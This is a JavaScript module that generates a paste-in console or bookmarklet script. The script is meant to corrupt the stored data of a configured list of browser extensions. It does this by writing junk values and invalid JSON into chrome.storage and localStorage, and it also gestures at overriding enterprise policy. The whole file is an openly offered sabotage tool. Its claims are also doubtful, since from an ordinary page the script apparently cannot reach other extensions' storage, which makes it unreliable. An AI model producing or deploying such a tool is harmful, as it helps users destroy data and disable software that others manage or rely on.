// corruptor.js - extension storage corruption script
import config from './config.json' assert { type: 'json' };

export function getCorruptorScript(extensions) {
    // Build a script that can be injected via console/bookmarklet to corrupt local storage and chrome.storage
    let script = `
// REDUX{btx} - Storage Corruptor
// Run this in the console of any page (or via bookmarklet) to corrupt extension data.

const targetKeys = ${JSON.stringify(extensions)};

// Helper to corrupt chrome.storage.local (if available)
function corruptChromeStorage(extId, keys) {
    if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
        const data = {};
        keys.forEach(k => {
            data[k] = 'REDUX_CORRUPTED_' + Date.now();
            // Also set invalid JSON to break parsing
            data[k + '_corrupt'] = '{INVALID_JSON';
        });
        chrome.storage.local.set(data, () => { console.log('Corrupted', extId); });
    }
}

// Fallback for localStorage (some extensions mirror there)
function corruptLocalStorage(extId, keys) {
    keys.forEach(k => {
        localStorage.setItem(extId + '_' + k, 'REDUX_CORRUPTED');
        localStorage.setItem(extId + '_' + k + '_backup', 'INVALID{JSON');
    });
}

// Execute for all known extensions
Object.entries(targetKeys).forEach(([name, data]) => {
    const id = data.id;
    const keys = data.targetKeys;
    corruptChromeStorage(id, keys);
    corruptLocalStorage(id, keys);
    console.log('Corrupted', name, id);
});

// Also try to delete their cached policies
if (typeof chrome !== 'undefined' && chrome.enterprise && chrome.enterprise.deviceAttributes) {
    // Some extensions read policy; we can't delete, but we can override with nonsense
    console.log('Policy override attempted (may not work in all contexts)');
}

console.log('REDUX{btx} corruption complete. Reload extensions or restart to apply.');
alert('REDUX{btx} - Extensions corrupted. Reload page or restart Chrome.');
`;

    return script;
}
